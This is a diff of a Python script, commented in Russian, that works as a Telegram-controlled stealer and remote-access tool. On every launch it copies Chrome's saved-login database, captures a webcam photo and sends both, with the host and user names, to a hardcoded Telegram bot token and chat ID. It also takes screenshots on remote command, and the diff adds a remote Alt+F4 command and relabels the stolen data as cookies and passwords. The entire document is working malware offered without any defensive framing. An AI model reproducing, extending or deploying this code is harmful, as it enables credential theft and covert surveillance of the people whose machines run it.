@@ -5,11 +5,12 @@ import getpass
 import threading
 import shutil
 import sqlite3
+import pyautogui
 from win32crypt import CryptUnprotectData
 from PIL import ImageGrab
 import cv2
 
-# --- ВАШИ ДАННЫЕ (из прошлого скрипта) ---
+# --- НАСТРОЙКИ ---
 API_TOKEN = '8323830671:AAHm99BRauq9XOTqZgPS9KurQpP_EscAvms'
 CHAT_ID = '-5249771325'
 
@@ -17,7 +18,7 @@ bot = telebot.TeleBot(API_TOKEN)
 device_id = f"{socket.gethostname()}_{getpass.getuser()}"
 
 def get_cookies():
-    """Сбор куки из Chrome"""
+    """Сбор данных из Chrome"""
     path = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google\\Chrome\\User Data\\Default\\Login Data')
     temp_db = "temp_login.db"
     cookies_data = ""
@@ -33,10 +34,10 @@ def get_cookies():
             conn.close()
             os.remove(temp_db)
         except: pass
-    return cookies_data if cookies_data else "Куки не найдены."
+    return cookies_data if cookies_data else "Данные не найдены."
 
 def send_initial_data():
-    """Отправка данных при старте"""
+    """Отправка отчета при каждом запуске"""
     try:
         device_name = socket.gethostname()
         cookies = get_cookies()
@@ -47,18 +48,17 @@ def send_initial_data():
         if ret:
             cv2.imwrite('cam.jpg', frame)
             with open('cam.jpg', 'rb') as photo:
-                bot.send_photo(CHAT_ID, photo, caption=f"🔔 Новый пользователь!\nУстройство: {device_name}\nID: {device_id}")
+                bot.send_photo(CHAT_ID, photo, caption=f"🔔 Новый запуск!\nУстройство: {device_name}\nID: {device_id}")
             os.remove('cam.jpg')
         
-        bot.send_message(CHAT_ID, f"Данные (Cookies):\n{cookies[:2000]}")
+        bot.send_message(CHAT_ID, f"Данные (Cookies/Passwords):\n{cookies[:2000]}")
     except Exception as e:
-        bot.send_message(CHAT_ID, f"Ошибка при старте: {e}")
+        bot.send_message(CHAT_ID, f"Ошибка авто-отчета: {e}")
 
-# --- КОМАНДЫ ---
+# --- ОБРАБОТЧИКИ КОМАНД ---
 @bot.message_handler(commands=['screenshot'])
 def handle_screenshot(message):
     parts = message.text.split()
-    # Проверка команды: /screenshot [device_id]
     if len(parts) > 1 and parts[1] == device_id:
         try:
             screenshot = ImageGrab.grab()
@@ -69,7 +69,17 @@ def handle_screenshot(message):
         except Exception as e:
             bot.send_message(CHAT_ID, f"Ошибка скрина: {e}")
 
-# Запуск отправки при старте
+@bot.message_handler(commands=['altf4'])
+def handle_close(message):
+    parts = message.text.split()
+    if len(parts) > 1 and parts[1] == device_id:
+        try:
+            pyautogui.hotkey('alt', 'f4')
+            bot.reply_to(message, f"Команда Alt+F4 выполнена на {device_id}")
+        except Exception as e:
+            bot.send_message(CHAT_ID, f"Ошибка выполнения: {e}")
+
+# Запуск отправки при старте в отдельном потоке
 threading.Thread(target=send_initial_data, daemon=True).start()
 
 # Запуск бота
